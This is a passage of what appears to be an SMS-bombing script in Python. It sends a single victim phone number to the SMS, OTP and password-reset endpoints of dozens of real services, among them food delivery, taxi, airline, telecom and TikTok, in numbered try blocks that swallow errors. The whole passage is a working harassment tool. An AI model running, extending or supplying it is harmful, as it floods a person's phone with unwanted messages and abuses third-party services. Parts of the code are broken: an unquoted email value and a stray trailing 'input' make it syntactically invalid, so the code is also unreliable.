        print(197)
    except:
        pass
     
    try:
        requests.post("https://pizza46.ru/ajaxGet.php",data={"phone": nomer},)
        print(198)
    except:
        pass
     
    try:
        requests.post("https://pizzakazan.com/auth/ajax.php",data={"phone": nomer,"method": "sendCode"},)
        print(199)
    except:
        pass
     
    try:
        requests.post("https://pizzasinizza.ru/api/phoneCode.php",json={"phone": nomer},)
        print(200)
    except:
        pass
    
    try:
        requests.get("https://vezitaxi.com/api/employment/getsmscode",params={"phone": nomer,"city": 561,"callback": "jsonp_callback_35979"},)
        print(201)
    except:
        pass
    
    try:
        requests.post("https://b.utair.ru/api/v1/login/",data={"login": nomer},)
        print(202)
    except:
        pass
    
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",json={"phone": nomer,"first_name": "-","utm_data": {},"via": "call"},)
        print(203)
    except:
        pass
    
    try:
        requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",json={"phone": nomer,"first_name": "-","utm_data": {},"via": "sms"},)
        print(204)
    except:
        pass
    
    try:
        requests.post("https://www.r-ulybka.ru/login/ajax.php",data={"action": "sendcode","phone": nomer},)
        print(205)
    except:
        pass
    
    try:
        requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",json={"doc": {"auth": {"mphone": nomer,"bdate": "11.11.1999","deviceid": "00100","version": "1.0","source": "site","signature": "undefined"},},},headers={"Accept": "application/json"},)
        print(206)
    except:
        pass
        
    try:
        requests.post("https://www.tvoyaapteka.ru/bitrix/ajax/form_user_new.php?confirm_register=1",data={"tel": nomer,"change_code": 1},)
        print(207)
    except:
        pass
        
    try:
        requests.post("https://m.tiktok.com/node/send/download_link",json={"slideVerify": 0,"language": "en","PhoneRegin": "","Mobile": nomer,"page": {"af_adset_id": 0, "pid": 0},},)
        print(208)
    except:
        pass
        
    try:
        requests.post(F"https://msk.tele2.ru/api/validation/number/" + nomer,json={"sender": "Tele2"},)
        print(209)
    except:
        pass
        
    try:
        requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php",data={"action": "callback_phonenumber","phone": nomer},)
        print(210)
    except:
        pass
        
    try:
        requests.post("https://www.tanuki.ru/api/",data={"phone": nomer,"type": 1},)
        print(211)
    except:
        pass
        
    try:
        requests.post("https://xn--80adjkr6adm9b.xn--p1ai/api/v5/user/start-authorization",json={"phone": nomer},)
        print(212)
    except:
        pass
        
    try:
        requests.get("https://auth.pizza33.ua/ua/join/check/",params={"callback": "angular.callbacks._1","email": mail@mail.com,"password": 'vvvvvv000m',"phone": nomer,"utm_current_visit_started": 0,"utm_first_visit": 0,"utm_previous_visit": 0,"utm_times_visited": 0,},)
        print(213)
    except:
        pass
        
    try:
        requests.post("https://pizzasushiwok.ru/index.php",data={"aj": "50","registration-phone": nomer},)
        print(214)
    except:
        pass
        
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "RegistrationSendSms","variables": {"phoneNumber": nomer},"query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n"},)
        print(215)
    except:
        pass
        
    try:
        requests.post("https://shafa.ua/api/v3/graphiql",json={"operationName": "sendResetPasswordSms","variables": {"phoneNumber": nomer},"query": "mutation sendResetPasswordSms($phoneNumber: String!) {\n  resetPasswordSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      ...errorsData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment errorsData on GraphResponseError {\n  field\n  messages {\n    code\n    message\n    __typename\n  }\n  __typename\n}\n"},)
        print(216)
    except:
        pass
        
    try:
        requests.post("https://api.saurisushi.ru/Sauri/api/v2/auth/login",data={"data": json.dumps({"login": nomer},),},)
        print(217)
    except:
        pass
        
    try:
        requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": nomer,"c": "3"},)
        print(218)
    except:
        pass
        
    try:
        requests.post("https://www.rbt.ru/user/sendCode/",data={"phone": nomer},)
        print(219)
    except:
        pass
        
    try:
        requests.get("https://sso.cloud.qlean.ru/http/users/requestotp",headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},params={"phone": nomer,"clientId": "undefined","sessionId": str(randint(5000, 9999),),},)
        print(220)
    except:
        pass
input
